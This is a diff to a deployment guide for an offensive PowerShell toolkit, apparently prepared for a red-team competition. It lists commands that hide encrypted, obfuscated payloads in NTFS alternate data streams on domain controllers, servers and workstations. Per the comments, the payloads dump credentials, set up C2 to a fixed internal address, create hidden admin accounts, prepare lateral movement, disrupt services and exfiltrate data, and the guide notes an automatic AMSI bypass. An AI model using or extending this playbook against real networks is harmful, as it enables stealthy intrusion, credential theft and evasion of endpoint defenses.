@@ -7,36 +7,39 @@
 ### Domain Controllers (Tier 1 - Full Stealth)
 ```bash
 # Primary (defense evasion + cred dump + C2)
+# -Obfuscate Paranoid implies: -Encrypt -Randomize -ZeroWidthStreams -UseDeepPlacement -AttachToExisting
 pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/dc-primary.ps1 \
-  -Encrypt -Randomize -ZeroWidthStreams -UseDeepPlacement -AttachToExisting \
+  -Obfuscate Paranoid \
   -CreateDecoys 3 -InstanceCount 3 -OutputFile competition/dc-primary-deploy.txt
 
 # Secondary (domain recon + lateral prep + hidden admin)
 pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/dc-secondary.ps1 \
-  -Encrypt -Randomize -ZeroWidthStreams -UseDeepPlacement -AttachToExisting \
+  -Obfuscate Paranoid \
   -CreateDecoys 3 -InstanceCount 3 -OutputFile competition/dc-secondary-deploy.txt
 ```
 
 ### Windows Servers (Tier 2 - Medium Stealth)
 ```bash
 # Primary (firewall + C2 + service disruption)
+# -Obfuscate Advanced implies: -Encrypt -Randomize
 pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/server-primary.ps1 \
-  -Encrypt -Randomize -InstanceCount 2 -OutputFile competition/server-primary-deploy.txt
+  -Obfuscate Advanced -InstanceCount 2 -OutputFile competition/server-primary-deploy.txt
 
 # Secondary (RDP + admin creation + lateral prep)
 pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/server-secondary.ps1 \
-  -Encrypt -Randomize -InstanceCount 2 -OutputFile competition/server-secondary-deploy.txt
+  -Obfuscate Advanced -InstanceCount 2 -OutputFile competition/server-secondary-deploy.txt
 ```
 
 ### Workstations (Tier 3 - Rapid)
 ```bash
 # Primary (C2 + cred dump + quick wins)
+# -Obfuscate Advanced implies: -Encrypt -Randomize
 pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/workstation-primary.ps1 \
-  -Encrypt -Randomize -OutputFile competition/workstation-primary-deploy.txt
+  -Obfuscate Advanced -OutputFile competition/workstation-primary-deploy.txt
 
 # Secondary (recon + admin + exfil)
 pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/workstation-secondary.ps1 \
-  -Encrypt -Randomize -OutputFile competition/workstation-secondary-deploy.txt
+  -Obfuscate Advanced -OutputFile competition/workstation-secondary-deploy.txt
 ```
 
 ### Fallback (Tier 4 - Emergency Only)
@@ -177,3 +180,4 @@ Remove-Item C:\ProgramData\backup.zip -Force
 **All payloads pre-configured for 10.0.0.100:8080**
 **Deployment time: DC ~30s, Server ~15s, Workstation ~8s**
 **AMSI bypass: Automatic (XOR Fragment Splitting)**
+**Encryption: Advanced and Paranoid tiers auto-enable DPAPI AES-256 encryption — no explicit -Encrypt flag needed**
